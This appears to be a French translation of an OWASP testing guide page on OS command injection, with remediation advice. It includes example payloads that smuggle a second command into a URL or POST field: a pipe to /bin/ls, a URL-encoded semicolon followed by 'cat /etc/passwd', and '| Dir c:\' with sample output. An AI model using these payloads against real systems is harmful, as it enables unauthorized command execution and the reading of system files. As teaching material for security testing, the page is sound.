## Sommaire

Cet article décrit comment tester les injections de commandes systèmes
sur une application. Le testeur va essayer d'injecter une commande
système danas l'application via une requête HTTP.

L'injection de commandes systèmes est une technique utilisée via une
interface web pour exécuter des commandes systèmes sur le serveur web.
L'utilisateur envoie des commandes systèmes sur une interface web afin
de les exécuter. Toute interface web qui ne valide pas correctement ses
entrées est sujette à cette vulnérabilité. En pouvant exécuter des
commandes systèmes, l'utilisateur peut télécharger des programmes
malicieux ou même obtenir des mots de passe. L'injection de commandes
systèmes peut être évitée quand la securité est prise en compte pendant
la conception et le développement d'applications.

## Comment tester

Quand on visualise un fichier sur une application web, le nom du fichier
est souvent affiché dans l'URL. Perl permet de transférer des données
vers une instruction avec un pipe. L'utilisateur peut simplement ajouter
un symbole pipe " |" à la fin du nom du fichier.

Un exemple d'URL avant modification :

`http://sensitive/cgi-bin/userData.pl?doc=user1.txt`

Exemple d'URL modifiée :

`http://sensitive/cgi-bin/userData.pl?doc=/bin/ls`
`|`

Cela va exécuter la commande “/bin/ls”.

Ajouter un point-virgule à la fin de l'URL d'une page .PHP, suivi d'une
commande système, va exécuter la commande. %3B est le point-virgule
encodé en URL.
Exemple :
http://sensitive/something.php?dir=%3Bcat%20/etc/passwd

**Exemple**
Considérons le cas d'une application contenant un ensemble de documents
que l'on peut consulter depuis Internet. Si l'on lance WebScarab, on
obtient une requêete HTTP POST comme la suivante :

    POST http://www.example.com/public/doc HTTP/1.1
    Host: www.example.com
    User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20061010 FireFox/2.0
    Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
    Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 300
    Proxy-Connection: keep-alive
    Referer: http://127.0.0.1/WebGoat/attack?Screen=20
    Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
    Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
    Content-Type: application/x-www-form-urlencoded
    Content-length: 33

    Doc=Doc1.pdf

Dans cette requête POST, on observe comment l'application récupère le
document public. Maintenant, on peut tester s'il est possible d'ajouter
une commande système à injecter dans la requête POST. On essaie ce qui
suit :

    POST http://www.example.com/public/doc HTTP/1.1
    Host: www.example.com
    User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20061010 FireFox/2.0
    Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
    Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 300
    Proxy-Connection: keep-alive
    Referer: http://127.0.0.1/WebGoat/attack?Screen=20
    Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
    Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
    Content-Type: application/x-www-form-urlencoded
    Content-length: 33

    Doc=Doc1.pdf+
    |+Dir c:\

Si l'application ne valide pas la requête, on peut obtenir le résultat
suivant :

    Exec Results for 'cmd.exe /c type "C:\httpd\public\doc\"Doc=Doc1.pdf+
    |+Dir c:\'
    Output...
    Il volume nell'unità C non ha etichetta.
    Numero di serie Del volume: 8E3F-4B61
    Directory of c:\
     18/10/2006 00:27 2,675 Dir_Prog.txt
     18/10/2006 00:28 3,887 Dir_ProgFile.txt
     16/11/2006 10:43
        Doc
        11/11/2006 17:25
           Documents and Settings
           25/10/2006 03:11
              I386
              14/11/2006 18:51
             h4ck3r
             30/09/2005 21:40 25,934
            OWASP1.JPG
            03/11/2006 18:29
                Prog
                18/11/2006 11:20
                    Program Files
                    16/11/2006 21:12
                        Software
                        24/10/2006 18:25
                            Setup
                            24/10/2006 23:37
                                Technologies
                                18/11/2006 11:14
                                3 File 32,496 byte
                                13 Directory 6,921,269,248 byte disponibili
                                Return code: 0

Dans ce cas, on a réussi une attaque d'injection de commande système.

## Outils

  - OWASP [WebScarab](OWASP_WebScarab_Project "wikilink")
  - OWASP [WebGoat](OWASP_WebGoat_Project "wikilink")

## Références

**White papers**
\* <http://www.securityfocus.com/infocus/1709>

## Remédiation

### Validation

L'URL et les données de formulaire doivent être filtrées pour éliminer
les caractères invalides. Une liste noire de caractères est une option
mais il peut être difficile de penser à tous les caractères à interdire.
Certains peuvent ne pas être encore connus. Une liste blanche contenant
uniquement les caractères autorisés devrait être créée pour valider les
entrées utilisateur. Les caractères oubliés, comme les menaces encore
inconnues, seront éliminées par cette liste.

### Permissions

L'application web et ses composants devraient être exécutés sous des
permissions strictes, interdisant l'exécution de commandes systèmes.
Essayez de vérifier toutes ces informations lors de tests en boite
grise.